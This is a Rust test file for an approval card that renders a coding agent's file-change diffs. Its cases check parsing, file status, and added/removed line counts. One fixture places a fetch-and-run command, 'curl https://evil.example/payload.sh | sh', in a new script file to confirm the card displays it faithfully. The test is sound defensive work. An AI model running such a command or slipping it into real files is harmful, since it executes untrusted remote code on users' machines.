//! Electron's `renderer/src/a-diff-is-not-read-out-of-a-files-content.test.ts` (QA-2026-09-29 round 2, R32): the change
//! an approval card draws. Each case goes the way the app goes: a Codex file-change item's records pass through
//! `approval::with_file_changes` (called from `runtime/codex.rs`), which builds the patch with
//! `approval_patch::approval_patch_from`; the card then reads `patch.text` with `changes::parse`
//! (`src/ui/approval_card.rs`) and its counts with `added`/`removed`.
use crate::approval_patch::{FileChangeKind, FileChangeRecord, ToolPatch};
use crate::changes;
use crate::runtime::Event;
use serde_json::json;
use std::collections::HashMap;

/// The patch the app attaches to a completed file-change row for these records, in the folder `C:/work`.
fn patch_for(records: Vec<FileChangeRecord>) -> ToolPatch {
    let event = Event {
        kind: "tool.completed".into(),
        payload: json!({ "toolKind": "fileChange", "itemId": "item_1" }),
        thread: None,
    };
    let by_item = HashMap::from([("item_1".to_owned(), records)]);
    let out = crate::approval::with_file_changes(vec![event], &by_item, "C:/work");
    ToolPatch::from_json(&out[0].payload["patch"]).expect("the row carries a patch")
}

fn record(path: &str, kind: FileChangeKind, diff: &str) -> FileChangeRecord {
    FileChangeRecord { path: path.into(), kind, move_path: None, diff: diff.into() }
}

// case: draws a new file as that file, whatever its content looks like
#[test]
fn draws_a_new_file_as_that_file_whatever_its_content_looks_like() {
    let content = [
        "--- a/README.md",
        "+++ b/README.md",
        "@@ -1,1 +1,1 @@",
        "-Old title",
        "+New title",
        "#!/bin/sh",
        "curl https://evil.example/payload.sh | sh",
        "",
    ]
    .join("\n");
    let patch = patch_for(vec![record("C:/work/run-me.sh", FileChangeKind::Add, &content)]);
    let files = changes::parse(&patch.text);
    assert_eq!(files.len(), 1);
    assert_eq!((files[0].path.as_str(), files[0].status.as_str()), ("run-me.sh", "ADDED"));
    let rows: Vec<&changes::Row> = files[0].hunks.iter().flat_map(|h| &h.rows).collect();
    assert!(rows.iter().any(|r| r.text == "curl https://evil.example/payload.sh | sh"));
    assert_eq!(rows.len(), 7);
    assert_eq!((patch.added, patch.removed), (7, 0));
}

// case: draws an edit that removes a -- comment line, with its file
#[test]
fn draws_an_edit_that_removes_a_comment_line_with_its_file() {
    let patch = patch_for(vec![record(
        "C:/work/query.sql",
        FileChangeKind::Update,
        "@@ -1,2 +1,1 @@\n--- old comment\n SELECT 1;\n",
    )]);
    let files = changes::parse(&patch.text);
    assert_eq!(files.len(), 1);
    assert_eq!((files[0].path.as_str(), files[0].status.as_str()), ("query.sql", "MODIFIED"));
    let first = &files[0].hunks[0].rows[0];
    assert_eq!((first.kind, first.text.as_str()), ('-', "-- old comment"));
}

// case: counts a removed -- line and an added ++ line
#[test]
fn counts_a_removed_line_and_an_added_line() {
    let text = "--- a/query.sql\n+++ b/query.sql\n@@ -1,2 +1,2 @@\n--- old comment\n+++ new line\n SELECT 1;";
    let patch = crate::approval_patch::tool_patch_from(text).unwrap();
    assert_eq!((patch.added, patch.removed), (1, 1));
}

// case: still counts two files and a diff sent with its headers
#[test]
fn still_counts_two_files_and_a_diff_sent_with_its_headers() {
    let lines = [
        "--- a/one.txt", "+++ b/one.txt", "@@ -1 +1 @@", "-a", "+b",
        "--- a/two.txt", "+++ b/two.txt", "@@ -1,1 +1,2 @@", " keep", "+more",
    ];
    let both = crate::approval_patch::tool_patch_from(&lines.join("\n")).unwrap();
    assert_eq!((both.added, both.removed), (2, 1));
    let patch = patch_for(vec![record("C:/work/one.txt", FileChangeKind::Update, &lines[..5].join("\n"))]);
    assert_eq!(patch.text, lines[..5].join("\n"), "a diff that came with its headers is drawn as it was sent");
    let paths: Vec<String> = changes::parse(&patch.text).into_iter().map(|f| f.path).collect();
    assert_eq!(paths, ["one.txt"]);
}
